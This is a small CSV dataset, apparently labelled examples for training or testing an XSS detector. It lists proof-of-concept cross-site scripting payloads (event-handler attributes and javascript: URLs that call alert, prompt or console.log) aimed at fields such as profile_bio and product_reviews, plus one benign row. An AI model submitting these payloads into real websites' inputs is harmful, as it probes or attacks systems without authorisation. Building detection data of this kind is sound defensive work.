"payload","source","is_malicious","notes","input_field"
"<body onerror=""console.log('xss')"">","generated","True","body based with onerror","profile_bio"
"<body onerror=""console.log('xss')"">","generated","True","body based with onerror","profile_bio"
"<input type=""text"" onerror=""console.log('xss')"" autofocus>","generated","True","input based with onerror","product_reviews"
"<img onmouseover=""prompt('xss')"">","generated","True","img based with onmouseover","product_reviews"
"<body onmouseover=""alert('xss')"">","generated","True","body based with onmouseover","product_reviews"
"<input type=""text"" onerror=""prompt('xss')"" autofocus>","generated","True","input based with onerror","product_reviews"
"<svg onfocus=""alert('xss')"">","generated","True","svg based with onfocus","search_bar"
"<a href=""javascript:alert('xss')"">Click</a>","generated","True","a based with javascript:","product_reviews"
"<body onfocus=""alert('xss')"">","generated","True","body based with onfocus","profile_bio"
"<iframe src=""javascript:console.log('xss')""></iframe>","generated","True","iframe based with javascript:","profile_bio"
"Hello World","generated","False","Non-malicious text","search_bar"
